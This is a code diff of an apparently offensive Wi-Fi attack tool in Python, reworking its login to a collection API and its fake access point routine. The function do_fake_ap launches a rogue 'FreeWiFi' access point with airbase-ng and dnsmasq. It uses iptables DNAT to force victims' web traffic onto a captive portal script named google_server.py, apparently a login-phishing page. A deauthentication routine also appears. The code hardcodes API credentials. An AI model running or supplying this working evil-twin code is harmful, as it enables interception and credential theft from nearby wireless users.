@@ -8,7 +8,7 @@ import getpass
 
 # ── CONFIG ─────────────────────────────────────────────────────────────────────
 TARGET_INTERFACE = "wlan0"
-API_BASE         = 'http://192.168.1.7:30000/api'
+API_BASE         = 'http://192.168.1.23:30000/api'
 JWT_TOKEN        = None                                      # ← will be set after login
 
 # ── ANSI COLOR SYSTEM ──────────────────────────────────────────────────────────
@@ -155,7 +155,6 @@ def login_to_api():
 
     section("API AUTH  ·  /users/login")
 
-    # Hardcoded credentials as requested
     username = "asser"
     password = "1234"
 
@@ -175,29 +174,46 @@ def login_to_api():
             timeout=10
         )
 
+        print(f"Status: {r.status_code}")   # ← helpful for debugging
+
         if r.status_code in (200, 201):
+            # First, try to get token from JSON (in case it sometimes returns it)
             try:
                 data = r.json()
                 token = data.get("token") or data.get("access_token") or data.get("jwt")
-                if not token:
-                    err("Login ok but no token field found in JSON")
-                    return False
+            except:
+                data = {}
+                token = None
 
+            # If no token in JSON → extract it from Set-Cookie header (this is your case)
+            if not token:
+                if 'token' in r.cookies:
+                    token = r.cookies.get('token')
+                else:
+                    # Manual fallback: parse Set-Cookie header
+                    set_cookie = r.headers.get('Set-Cookie') or r.headers.get('set-cookie')
+                    if set_cookie and 'token=' in set_cookie:
+                        # Simple extraction (works for most cases)
+                        token = set_cookie.split('token=')[1].split(';')[0]
+
+            if token:
                 JWT_TOKEN = token
                 ok(f'{GB("LOGIN SUCCESSFUL")}')
-                info(f"token received ({len(token)} characters)")
+                info(f"token received from cookie ({len(token)} characters)")
+                # Optional: show first 20 + last 10 chars for verification
+                info(f"token preview: {token[:20]}...{token[-10:]}")
                 return True
-
-            except Exception as e:
-                err(f"JSON parse error: {str(e)}")
+            else:
+                err("Login ok but no token found in JSON or Set-Cookie header")
+                err(f"Response body: {r.text[:300]}")
                 return False
 
         else:
             try:
-                msg = r.json().get("error", r.text[:120])
+                msg = r.json().get("message") or r.json().get("error") or r.text[:150]
             except:
-                msg = r.text[:120] or "(no body)"
-            err(f"Login failed — {r.status_code} {msg}")
+                msg = r.text[:150] or "(no body)"
+            err(f"Login failed — {r.status_code} → {msg}")
             return False
 
     except requests.exceptions.ConnectionError:
@@ -210,32 +226,23 @@ def login_to_api():
         err(f"Login exception: {str(e)}")
         return False
 
-
 def _post(endpoint, payload, label='request', timeout=12):
-    """Send POST with JWT inside a cookie named 'token'"""
+    """Send POST with JWT token as cookie"""
     global JWT_TOKEN
 
     if not JWT_TOKEN:
         err("No JWT token — login failed earlier")
         return False, {}
 
-    # Important: send as COOKIE, not header
-    cookies = {
-        "token": JWT_TOKEN
-    }
-
-    headers = {
-        'Content-Type': 'application/json',
-        # You can keep Authorization too if backend accepts both — but probably not needed
-        # 'Authorization': f'Bearer {JWT_TOKEN}',
-    }
+    cookies = {"token": JWT_TOKEN}
+    headers = {'Content-Type': 'application/json'}
 
     try:
         r = requests.post(
             f'{API_BASE}/{endpoint}',
             json=payload,
             headers=headers,
-            cookies=cookies,           # ← this is the key change
+            cookies=cookies,
             timeout=timeout
         )
 
@@ -245,26 +252,22 @@ def _post(endpoint, payload, label='request', timeout=12):
             except:
                 data = {}
             return True, data
-
         else:
             try:
                 err_msg = r.json().get("error", r.text[:150])
             except:
                 err_msg = r.text[:150] or "(no body)"
             err(f'{label} → HTTP {r.status_code}: {err_msg}')
-            if r.status_code in (401, 403):
-                warn("Authentication failed (401/403) — check cookie / token format")
             return False, {}
 
     except requests.exceptions.Timeout:
-        err(f'{label} → timeout ({timeout}s)')
+        err(f'{label} → timeout')
     except requests.exceptions.ConnectionError:
         err(f'{label} → connection refused')
     except Exception as e:
         err(f'{label} → {str(e)[:80]}')
 
     return False, {}
-
 
 def send_to_api(networks):
     if not networks:
@@ -957,13 +960,15 @@ def do_deauth_only(mon, bssid, channel):
     ok('deauth complete'); endsection()
 
 # ══════════════════════════════════════════════════════════════════════════════
-# FAKE ACCESS POINT
+# FAKE ACCESS POINT (Working + Full Clean Shutdown)
 # ══════════════════════════════════════════════════════════════════════════════
 def do_fake_ap(mon, essid='FreeWiFi', channel=6,
                portal_script='/home/kali/Desktop/captiveportals/google_server.py'):
+    
     section(f'FAKE AP  ·  {CY(essid)}  ch{channel}')
 
     airbase_p = dnsmasq_p = server_p = None
+
     reset_cmds = [
         ['iptables', '--flush'],
         ['iptables', '-t', 'nat', '--flush'],
@@ -971,97 +976,147 @@ def do_fake_ap(mon, essid='FreeWiFi', channel=6,
         ['iptables', '-t', 'nat', '--delete-chain'],
     ]
 
-    def run(cmd):
-        result = subprocess.run(cmd, check=True, timeout=8,
-                                capture_output=True, text=True)
-        return result
+    def run(cmd, check=True, timeout=8, silent=False):
+        try:
+            result = subprocess.run(cmd, check=check, timeout=timeout,
+                                    capture_output=True, text=True)
+            if not silent and result.stdout.strip():
+                print(f"  {DM(result.stdout.strip())}")
+            return result
+        except Exception:
+            if not silent:
+                err(f"Command failed: {' '.join(map(str, cmd))}")
+            return None
 
     try:
+        # Gentle cleanup before starting
+        info("Preparing environment...")
+        subprocess.run(['killall', 'dnsmasq'], timeout=5, capture_output=True, check=False)
+        time.sleep(1)
+
+        # Start Rogue AP
+        info(f"Starting airbase-ng on {mon} ...")
         airbase_p = subprocess.Popen(
-            ['airbase-ng', '-e', essid, '-c', str(channel), mon],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            ['airbase-ng', '-e', essid, '-c', str(channel), '-P', mon],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
         )
         time.sleep(6)
 
         run(['ifconfig', 'at0', 'up'])
-        run(['ifconfig', 'at0', '10.0.0.1', 'netmask', '255.255.255.0'])
-        ok('at0 → 10.0.0.1')
+        run(['ifconfig', 'at0', '200.200.200.1', 'netmask', '255.255.255.0'])
+        ok('at0 interface configured → 200.200.200.1')
 
-        for _ in range(12):
+        for _ in range(20):
             r = subprocess.run(['ip', 'link', 'show', 'at0'], capture_output=True, text=True)
-            if 'UP' in r.stdout: ok('at0 interface up'); break
+            if 'UP' in r.stdout.upper():
+                ok('at0 interface is UP')
+                break
             time.sleep(0.5)
         else:
             raise RuntimeError('at0 never came up')
 
-        subprocess.run('echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward',
-                       shell=True, check=True, timeout=5)
+        run(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
         ok('IP forwarding enabled')
 
+        # Start dnsmasq
+        info('Starting dnsmasq...')
         dnsmasq_p = subprocess.Popen(
-            ['dnsmasq', '-C', '/etc/dnsmasq.conf', '--log-queries', '--log-dhcp', '--log-facility=-'],
+            ['dnsmasq', '-C', '/etc/dnsmasq.conf', '--log-queries', '--log-dhcp'],
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
         )
-        info('waiting for dnsmasq...')
+
         start = time.time()
-        while time.time() - start < 6:
+        while time.time() - start < 10:
             line = dnsmasq_p.stdout.readline()
             if line:
-                print(f'  {DM(line.strip())}')
-                if 'started, version' in line: ok('dnsmasq running'); break
-            time.sleep(0.1)
+                print(f"  {DM(line.strip())}")
+                if 'started' in line.lower():
+                    ok('dnsmasq started successfully')
+                    break
+            time.sleep(0.2)
 
+        # iptables for captive portal
+        info('Configuring iptables...')
         for cmd in reset_cmds:
-            try: subprocess.run(cmd, timeout=5)
+            try: subprocess.run(cmd, timeout=5, capture_output=True)
             except: pass
 
-        for cmd in [
-            ['iptables','-t','nat','-A','PREROUTING','-p','tcp','--dport','80','-j','DNAT','--to-destination','10.0.0.1:80'],
-            ['iptables','-t','nat','-A','PREROUTING','-p','tcp','--dport','443','-j','DNAT','--to-destination','10.0.0.1:80'],
-            ['iptables','-t','nat','-A','POSTROUTING','-j','MASQUERADE'],
-        ]:
-            subprocess.run(cmd, check=True, timeout=8)
+        iptables_rules = [
+            ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80',  '-j', 'DNAT', '--to-destination', '200.200.200.1:80'],
+            ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '443', '-j', 'DNAT', '--to-destination', '200.200.200.1:80'],
+            ['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'at0', '-j', 'MASQUERADE'],
+            ['iptables', '-A', 'FORWARD', '-i', 'at0', '-j', 'ACCEPT'],
+        ]
+        for cmd in iptables_rules:
+            run(cmd)
+
         ok('iptables configured')
 
+        # Start captive portal
         server_path = os.path.expanduser(portal_script)
         if not os.path.isfile(server_path):
-            raise FileNotFoundError(f'portal script missing: {server_path}')
-        server_p = subprocess.Popen(
-            ['python3', server_path],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-        )
-        ok(f'captive portal running → {DM(server_path)}')
+            raise FileNotFoundError(f"Portal script not found: {server_path}")
+
+        info(f"Starting captive portal → {DM(server_path)}")
+        server_p = subprocess.Popen(['python3', server_path],
+                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
         print()
-        ok(GB('FAKE AP ACTIVE'))
-        info('connect device — captive portal should intercept HTTP/HTTPS')
-        info(f'debug → tail -f /var/log/syslog | grep dnsmasq')
+        ok(GB('FAKE ACCESS POINT IS ACTIVE!'))
+        info(f"SSID → {essid} | Channel → {channel}")
+        info("Connect your phone to FreeWiFi")
 
-        anim = Anim('radar', 'rogue AP running')
+        # Wait for user
+        anim = Anim('radar', 'Rogue AP running...')
         anim.start()
-        input(f'\n {YL("press ENTER to stop")} ')
+        input(f'\n {YL("Press ENTER to stop and clean up")} ')
         anim.stop()
 
     except Exception as e:
-        err(f'error: {str(e)}')
+        err(f'Error: {str(e)}')
     finally:
-        info('cleaning up...')
+        # ====================== FULL CLEANUP ======================
+        info('Cleaning up all changes...')
+
+        # Kill all processes
         for p in [server_p, dnsmasq_p, airbase_p]:
             try:
-                if p and p.poll() is None: p.terminate(); p.wait(timeout=5)
+                if p and p.poll() is None:
+                    p.terminate()
+                    p.wait(timeout=5)
             except:
-                try: p.kill()
-                except: pass
-        for cmd in reset_cmds:
-            try: subprocess.run(cmd, timeout=5)
-            except: pass
-        try:
-            subprocess.run('echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward',
-                           shell=True, timeout=3)
-        except: pass
-        ok('fake AP stopped')
-    endsection()
+                try:
+                    p.kill()
+                except:
+                    pass
 
+        # Reset iptables completely
+        for cmd in reset_cmds:
+            try:
+                subprocess.run(cmd, timeout=5, capture_output=True)
+            except:
+                pass
+
+        # Disable IP forwarding
+        try:
+            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], timeout=5, capture_output=True)
+        except:
+            pass
+
+        # Bring down at0 interface
+        try:
+            subprocess.run(['ifconfig', 'at0', 'down'], timeout=5, capture_output=True)
+            subprocess.run(['ip', 'link', 'delete', 'at0'], timeout=5, capture_output=True)
+        except:
+            pass
+
+        # Kill any remaining dnsmasq
+        subprocess.run(['killall', 'dnsmasq'], timeout=5, capture_output=True, check=False)
+
+        ok('All services stopped and system restored')
+        info('Fake AP fully cleaned up - ready for normal use again')
+    
+    endsection()
 # ══════════════════════════════════════════════════════════════════════════════
 # MENU
 # ══════════════════════════════════════════════════════════════════════════════
